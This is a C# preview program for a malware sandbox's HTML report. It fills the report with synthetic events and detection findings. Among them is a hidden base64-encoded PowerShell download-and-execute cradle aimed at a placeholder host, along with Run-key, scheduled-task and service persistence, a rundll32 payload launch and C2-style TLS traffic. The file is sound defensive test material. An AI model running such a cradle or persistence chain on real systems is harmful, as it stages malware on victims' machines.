using KSword.Sandbox.Abstractions;
using KSword.Sandbox.Abstractions.Artifacts;
using KSword.Sandbox.Core.Reporting;

// Renders a synthetic but structurally complete report so the HTML UI can be
// screenshotted and reviewed without running Hyper-V.

var outputDir = args.Length > 0 ? args[0] : Path.Combine(AppContext.BaseDirectory, "out");
Directory.CreateDirectory(outputDir);

var report = BuildReport();
var artifacts = BuildArtifacts();
var collections = BuildCollections();

var renderer = new HtmlReportRenderer();
foreach (var doc in renderer.RenderBilingualReports(report, artifacts, collections))
{
    var path = Path.Combine(outputDir, doc.FileName);
    File.WriteAllText(path, doc.Html);
    Console.WriteLine($"wrote {path} ({doc.Html.Length:N0} chars)");
}

return 0;

static AnalysisReport BuildReport()
{
    var t = new DateTimeOffset(2026, 7, 12, 1, 2, 3, TimeSpan.Zero);
    var events = new List<SandboxEvent>();

    SandboxEvent Ev(string type, double sec, string source, Dictionary<string, string>? data = null) =>
        new()
        {
            EventType = type,
            Timestamp = t.AddSeconds(sec),
            Source = source,
            Data = data ?? []
        };

    // process tree: sample -> powershell -> rundll32
    events.Add(new SandboxEvent
    {
        EventType = "process.start",
        Timestamp = t.AddMilliseconds(100),
        Source = "guest",
        ProcessName = "story.exe",
        ProcessId = 5000,
        ParentProcessId = 1200,
        Path = @"C:\Samples\story.exe",
        CommandLine = @"C:\Samples\story.exe --auto"
    });
    events.Add(new SandboxEvent
    {
        EventType = "process.start",
        Timestamp = t.AddMilliseconds(600),
        Source = "guest",
        ProcessName = "powershell.exe",
        ProcessId = 5100,
        ParentProcessId = 5000,
        Path = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        CommandLine = "powershell.exe -nop -w hidden -enc SQBFAFgAKAAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADAALgAyAC4AOAAvAHMAdABhAGcAZQAuAHAAcwAxACIAKQA="
    });
    events.Add(new SandboxEvent
    {
        EventType = "process.start",
        Timestamp = t.AddSeconds(1),
        Source = "guest",
        ProcessName = "rundll32.exe",
        ProcessId = 5200,
        ParentProcessId = 5100,
        Path = @"C:\Windows\System32\rundll32.exe",
        CommandLine = @"rundll32.exe C:\Samples\payload.dll,Start"
    });
    events.Add(Ev("process.observed", 1.5, "guest", new()
    {
        ["processName"] = "svchost.exe",
        ["processId"] = "900",
        ["behaviorCounted"] = "false",
        ["nonbehavior"] = "true"
    }));

    // file + registry + persistence
    events.Add(new SandboxEvent
    {
        EventType = "file.created",
        Timestamp = t.AddSeconds(2),
        Source = "guest",
        ProcessName = "story.exe",
        ProcessId = 5000,
        Path = @"C:\Users\Public\stage2.exe",
        Data = new() { ["fileSize"] = "512" }
    });
    events.Add(new SandboxEvent
    {
        EventType = "registry.run.created",
        Timestamp = t.AddSeconds(2.2),
        Source = "guest",
        ProcessName = "story.exe",
        ProcessId = 5000,
        Path = @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\StoryUpdater",
        Data = new() { ["valueName"] = "StoryUpdater", ["valueData"] = @"C:\Users\Public\stage2.exe" }
    });
    events.Add(new SandboxEvent
    {
        EventType = "scheduled_task.created",
        Timestamp = t.AddSeconds(2.4),
        Source = "guest",
        ProcessName = "story.exe",
        ProcessId = 5000,
        Path = @"\Microsoft\Windows\StoryTelemetry",
        Data = new() { ["taskTrigger"] = "logon" }
    });
    events.Add(new SandboxEvent
    {
        EventType = "service.created",
        Timestamp = t.AddSeconds(2.6),
        Source = "guest",
        ProcessName = "story.exe",
        ProcessId = 5000,
        Path = "StorySvc",
        Data = new() { ["serviceStartType"] = "auto", ["servicePath"] = @"C:\Users\Public\stage2.exe" }
    });

    // network
    events.Add(new SandboxEvent
    {
        EventType = "dns.query",
        Timestamp = t.AddSeconds(3),
        Source = "guest",
        ProcessName = "powershell.exe",
        ProcessId = 5100,
        Path = "stage.example-c2.top",
        Data = new() { ["queryType"] = "A", ["resolvedAddresses"] = "192.0.2.8" }
    });
    events.Add(new SandboxEvent
    {
        EventType = "http.request",
        Timestamp = t.AddSeconds(3.2),
        Source = "guest",
        ProcessName = "powershell.exe",
        ProcessId = 5100,
        Path = "http://192.0.2.8/stage.ps1",
        Data = new() { ["httpMethod"] = "GET", ["userAgent"] = "Mozilla/5.0", ["statusCode"] = "200" }
    });
    events.Add(new SandboxEvent
    {
        EventType = "tls.connection",
        Timestamp = t.AddSeconds(3.4),
        Source = "guest",
        ProcessName = "rundll32.exe",
        ProcessId = 5200,
        Data = new() { ["remoteAddress"] = "203.0.113.55", ["remotePort"] = "443", ["serverName"] = "cdn.example-c2.top", ["ja3"] = "aaaabbbbccccddddeeeeffff00001111" }
    });
    events.Add(new SandboxEvent
    {
        EventType = "network.tcp",
        Timestamp = t.AddSeconds(3.6),
        Source = "guest",
        ProcessName = "rundll32.exe",
        ProcessId = 5200,
        Data = new() { ["remoteAddress"] = "203.0.113.55", ["remotePort"] = "443", ["protocol"] = "tcp", ["bytesSent"] = "2048", ["bytesReceived"] = "65536" }
    });
    events.Add(Ev("network.tcp.closed", 4, "guest", new()
    {
        ["sampleCorrelation"] = "environment",
        ["sampleCorrelationStatus"] = "environment",
        ["behaviorCounted"] = "false",
        ["nonbehavior"] = "true",
        ["remoteAddress"] = "198.51.100.40",
        ["remotePort"] = "443"
    }));

    // privilege / security
    events.Add(new SandboxEvent
    {
        EventType = "security.privilege",
        Timestamp = t.AddSeconds(2.8),
        Source = "guest",
        ProcessName = "story.exe",
        ProcessId = 5000,
        Data = new() { ["privilegeName"] = "SeDebugPrivilege", ["privilegeState"] = "enabled" }
    });
    events.Add(Ev("process.token", 2.9, "guest", new()
    {
        ["processName"] = "story.exe",
        ["processId"] = "5000",
        ["integrityLevel"] = "high",
        ["userSid"] = "S-1-5-21-1234"
    }));

    // static analysis event
    events.Add(new SandboxEvent
    {
        EventType = "static.pe.resource",
        Timestamp = t.AddSeconds(2.1),
        Source = "host",
        Path = @"D:\Samples\story.exe",
        Data = new()
        {
            ["resourceType"] = "RCDATA",
            ["resourceRole"] = "embedded-pe",
            ["isEmbeddedPe"] = "True",
            ["entropy"] = "7.850",
            ["size"] = "4096"
        }
    });

    // VT
    events.Add(new SandboxEvent
    {
        EventType = "enrichment.virustotal.lookup",
        Timestamp = t.AddSeconds(5),
        Source = "virustotal",
        Path = "https://www.virustotal.com/gui/file/" + new string('a', 64),
        Data = new()
        {
            ["vtStatus"] = "found",
            ["vtVerdict"] = "malicious",
            ["vtMalicious"] = "3",
            ["vtSuspicious"] = "1",
            ["vtHarmless"] = "59",
            ["vtUndetected"] = "8",
            ["vtEngineCount"] = "71",
            ["vtReputation"] = "-12",
            ["vtCommunityScore"] = "-2",
            ["communityScoreSource"] = "reputation",
            ["vtCommunityHarmlessVotes"] = "1",
            ["vtCommunityMaliciousVotes"] = "3",
            ["vtCommunityVoteCount"] = "4",
            ["lastAnalysisDateUtc"] = "2026-07-10T00:00:00.0000000Z",
            ["permalink"] = "https://www.virustotal.com/gui/file/" + new string('a', 64)
        }
    });

    // artifact index + captures
    events.Add(Ev("host.artifact.index", 6, "host", new()
    {
        ["behaviorCounted"] = "false",
        ["nonbehavior"] = "true",
        ["notSampleBehavior"] = "true",
        ["artifactEvidenceMatrix"] = "dropped-files=1:ready:512;screenshots=2:ready:2048;memory-dumps=1:ready:4096;packet-captures=1:ready:8192",
        ["artifactEvidenceCollectionsReady"] = "dropped-files,screenshots,memory-dumps,packet-captures",
        ["primaryArtifactSelectors"] = "artifacts/drop.bin,screenshots/desktop.png,dumps/story.dmp,captures/story.pcapng",
        ["droppedFileArtifactCount"] = "1",
        ["screenshotArtifactCount"] = "2",
        ["memoryDumpArtifactCount"] = "1",
        ["packetCaptureArtifactCount"] = "1",
        ["droppedFileBytes"] = "512",
        ["screenshotBytes"] = "2048",
        ["memoryDumpBytes"] = "4096",
        ["packetCaptureBytes"] = "8192"
    }));
    events.Add(new SandboxEvent
    {
        EventType = "screenshot.captured",
        Timestamp = t.AddSeconds(6.1),
        Source = "guest",
        ProcessName = "story.exe",
        ProcessId = 5000,
        Data = new() { ["screenshotRelativePath"] = "screenshots/desktop.png", ["collectionName"] = "screenshots", ["captureStatus"] = "captured" }
    });
    events.Add(new SandboxEvent
    {
        EventType = "memory_dump.captured",
        Timestamp = t.AddSeconds(6.2),
        Source = "guest",
        ProcessName = "story.exe",
        ProcessId = 5000,
        Data = new() { ["memoryDumpRelativePath"] = "dumps/story.dmp", ["collectionName"] = "memory-dumps", ["childProcessDumpEnabled"] = "true" }
    });
    events.Add(new SandboxEvent
    {
        EventType = "pcap.imported",
        Timestamp = t.AddSeconds(6.3),
        Source = "host",
        ProcessName = "story.exe",
        ProcessId = 5000,
        Data = new() { ["pcapngRelativePath"] = "captures/story.pcapng", ["collectionName"] = "packet-captures", ["pcapngPacketCount"] = "42" }
    });

    // collection health lanes
    events.Add(Ev("startup_item.wmi.capture_failed", 7, "guest", new()
    {
        ["collectionHealth"] = "true", ["nonbehavior"] = "true", ["phase"] = "before-start", ["exitCode"] = "1"
    }));
    events.Add(Ev("etw_live.disabled", 7.1, "guest", new()
    {
        ["collectionHealth"] = "true", ["nonbehavior"] = "true", ["etwLiveCaptureEnabled"] = "false", ["etwLiveCaptureState"] = "disabled"
    }));
    events.Add(Ev("etw_security.surface.readiness", 7.2, "guest", new()
    {
        ["collectionHealth"] = "true", ["nonbehavior"] = "true", ["surfaceSubscribed"] = "false", ["surfaceKey"] = "security.process"
    }));
    events.Add(Ev("security_eventlog.audit_policy.summary", 7.3, "guest", new()
    {
        ["collectionHealth"] = "true", ["nonbehavior"] = "true", ["captureState"] = "partial", ["auditPolicyStatus"] = "targetPoliciesNotFullySuccessEnabled"
    }));
    events.Add(Ev("r0collector.disabled", 7.4, "r0collector", new()
    {
        ["collectionHealth"] = "true", ["r0Enabled"] = "false"
    }));

    // R0 health rows
    for (var i = 0; i < 3; i++)
    {
        events.Add(Ev("collector.health", 8 + i * 0.1, "r0collector", new()
        {
            ["queueDepth"] = (3 - i).ToString(),
            ["droppedCount"] = "0",
            ["collectorState"] = "running"
        }));
    }

    // failure rows
    events.Add(Ev("process.start_failed", 8.5, "guest", new()
    {
        ["failureHint"] = "sample start timed out after 120s",
        ["processName"] = "helper.exe"
    }));

    // raw noise
    for (var index = 0; index < 40; index++)
    {
        events.Add(Ev($"story.raw.{index:D2}", 10 + index, "guest", new()
        {
            ["rawSource"] = "events.json",
            ["index"] = index.ToString()
        }));
    }

    var powershellEvidence = events.Where(e => e.ProcessName is "powershell.exe").ToList();
    var rundllEvidence = events.Where(e => e.ProcessName is "rundll32.exe").ToList();

    return new AnalysisReport
    {
        JobId = Guid.Parse("aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"),
        GeneratedAt = t,
        Status = AnalysisStatus.Completed,
        Provider = VirtualizationProvider.HyperV,
        TargetVmName = "KSWORD-WIN11",
        BaselineName = "clean-base",
        Sample = new SampleIdentity
        {
            FileName = "story.exe",
            FullPath = @"D:\Samples\story.exe",
            Sha256 = new string('a', 64),
            Sha1 = new string('b', 40),
            Md5 = new string('c', 32),
            Crc32 = "1234abcd",
            SizeBytes = 4096
        },
        SampleIdentityStatus = "matched",
        StaticAnalysis = new StaticAnalysisResult
        {
            FileFormat = "PE32+",
            Magic = "MZ",
            IsPe = true,
            Architecture = "x64",
            Subsystem = "Windows GUI",
            Resources =
            [
                new PeResourceInfo
                {
                    ResourceType = "RCDATA",
                    DataRva = "0x00004000",
                    DataFileOffset = "0x00002000",
                    Size = 4096,
                    Entropy = 7.85,
                    EntropyLabel = "high",
                    IsPayloadCandidate = true,
                    IsEmbeddedPe = true,
                    IsLarge = true,
                    Tags = ["resource_high_entropy_data", "resource_embedded_pe"]
                }
            ],
            Tags = ["resource_embedded_pe"],
            InterestingStrings = ["resource:RCDATA@file=0x2000", "http://192.0.2.8/stage.ps1", "SQBFAFgA"]
        },
        Events = events,
        Findings =
        [
            new BehaviorFinding
            {
                RuleId = "BHV-101",
                Title = "Spawns PowerShell with encoded download cradle",
                Severity = "critical",
                Confidence = "high",
                MitreTechniqueId = "T1059.001",
                MitreTechniqueName = "PowerShell",
                Summary = "The sample launched a hidden PowerShell process with a base64-encoded command that downloads a second-stage script.",
                Tags = ["execution", "download"],
                Evidence = powershellEvidence
            },
            new BehaviorFinding
            {
                RuleId = "BHV-204",
                Title = "Establishes Run key persistence",
                Severity = "high",
                Confidence = "high",
                MitreTechniqueId = "T1547.001",
                MitreTechniqueName = "Registry Run Keys",
                Summary = "A HKCU Run value pointing at the dropped stage2 executable was created during the run.",
                Tags = ["persistence"],
                Evidence = events.Where(e => e.EventType == "registry.run.created").ToList()
            },
            new BehaviorFinding
            {
                RuleId = "BHV-310",
                Title = "Contacts DGA-like domain over TLS",
                Severity = "high",
                Confidence = "medium",
                MitreTechniqueId = "T1071.001",
                MitreTechniqueName = "Web Protocols",
                Summary = "rundll32 opened a TLS connection to 203.0.113.55 using SNI cdn.example-c2.top shortly after the encoded download.",
                Tags = ["command-and-control"],
                Evidence = rundllEvidence
            },
            new BehaviorFinding
            {
                RuleId = "BHV-402",
                Title = "Enables SeDebugPrivilege",
                Severity = "medium",
                Confidence = "medium",
                MitreTechniqueId = "T1134",
                MitreTechniqueName = "Access Token Manipulation",
                Summary = "The sample enabled SeDebugPrivilege, which is commonly used to inspect or inject into other processes.",
                Tags = ["privilege-escalation"],
                Evidence = events.Where(e => e.EventType == "security.privilege").ToList()
            }
        ],
        CollectionHealth = new CollectionHealthSummary
        {
            State = "degraded",
            StateReasons = ["etw-live-disabled", "r0-disabled", "wmi-startup-capture-failed"],
            FailureRows = 1,
            LossRows = 0,
            TotalRows = events.Count,
            RawRows = events.Count,
            ReportRows = events.Count,
            DriverHealthRows = 3,
            EtwFailureRows = 1,
            RunbookLaunchContext = "interactive-desktop"
        }
    };
}

static IReadOnlyList<ArtifactDescriptor> BuildArtifacts() =>
[
    new ArtifactDescriptor
    {
        Kind = ArtifactKind.DroppedFile,
        Category = "dropped-file",
        Name = "drop.bin",
        RelativePath = "artifacts/drop.bin",
        SafeLink = "artifacts/drop.bin",
        FullPath = @"D:\Jobs\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\artifacts\drop.bin",
        ImportPath = "artifacts/drop.bin",
        SizeBytes = 512,
        Sha256 = new string('d', 64),
        Metadata = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            ["downloadSelector"] = "artifacts/drop.bin",
            ["safeRelativeSelector"] = "artifacts/drop.bin",
            ["duplicateGroupKey"] = "sha256:" + new string('d', 64),
            ["duplicateGroupId"] = "duplicate-drop",
            ["duplicateGroupCount"] = "2",
            ["duplicateOrdinal"] = "1",
            ["isDuplicate"] = "true",
            ["duplicatePrimarySelector"] = "artifacts/primary-drop.bin",
            ["duplicateOfArtifactRelativePath"] = "artifacts/primary-drop.bin",
            ["rejectionDiagnosticsAvailable"] = "true",
            ["rejectedArtifactCount"] = "1",
            ["lastRejectedArtifactSelector"] = "../unsafe.bin",
            ["artifactRejectionReasons"] = "unsafeGuestArtifactPath"
        }
    },
    new ArtifactDescriptor
    {
        Kind = ArtifactKind.Screenshot,
        Category = "screenshot",
        Name = "desktop.png",
        RelativePath = "screenshots/desktop.png",
        SafeLink = "screenshots/desktop.png",
        SizeBytes = 2048,
        Sha256 = new string('e', 64),
        Metadata = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            ["downloadSelector"] = "screenshots/desktop.png"
        }
    },
    new ArtifactDescriptor
    {
        Kind = ArtifactKind.Screenshot,
        Category = "screenshot",
        Name = "window.png",
        RelativePath = "screenshots/window.png",
        SafeLink = "screenshots/window.png",
        SizeBytes = 4096,
        Sha256 = new string('a', 64),
        Metadata = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            ["downloadSelector"] = "screenshots/window.png"
        }
    },
    new ArtifactDescriptor
    {
        Kind = ArtifactKind.MemoryDump,
        Category = "memory-dump",
        Name = "story.dmp",
        RelativePath = "dumps/story.dmp",
        SafeLink = "dumps/story.dmp",
        SizeBytes = 4096,
        Sha256 = new string('f', 64),
        Metadata = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            ["downloadSelector"] = "dumps/story.dmp"
        }
    },
    new ArtifactDescriptor
    {
        Kind = ArtifactKind.PacketCapture,
        Category = "packet-capture",
        Name = "story.pcapng",
        RelativePath = "captures/story.pcapng",
        SafeLink = "captures/story.pcapng",
        SizeBytes = 8192,
        Sha256 = new string('1', 64),
        Metadata = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            ["downloadSelector"] = "captures/story.pcapng"
        }
    }
];

static IEnumerable<ArtifactCollectionDescriptor> BuildCollections() =>
[
    new ArtifactCollectionDescriptor
    {
        Name = "dropped-files",
        Kind = ArtifactKind.DroppedFile,
        Category = "dropped-file",
        Status = "ready",
        Reason = "collected",
        Enabled = true
    },
    new ArtifactCollectionDescriptor
    {
        Name = "screenshots",
        Kind = ArtifactKind.Screenshot,
        Category = "screenshot",
        Status = "ready",
        Reason = "collected",
        Enabled = true
    },
    new ArtifactCollectionDescriptor
    {
        Name = "memory-dumps",
        Kind = ArtifactKind.MemoryDump,
        Category = "memory-dump",
        Status = "ready",
        Reason = "collected",
        Enabled = true
    },
    new ArtifactCollectionDescriptor
    {
        Name = "packet-captures",
        Kind = ArtifactKind.PacketCapture,
        Category = "packet-capture",
        Status = "ready",
        Reason = "collected",
        Enabled = true
    },
    new ArtifactCollectionDescriptor
    {
        Name = "etw-live",
        Kind = ArtifactKind.Unknown,
        Category = "etw",
        Status = "disabled",
        Reason = "live ETW capture disabled by configuration",
        Enabled = false,
        Implemented = false
    }
];
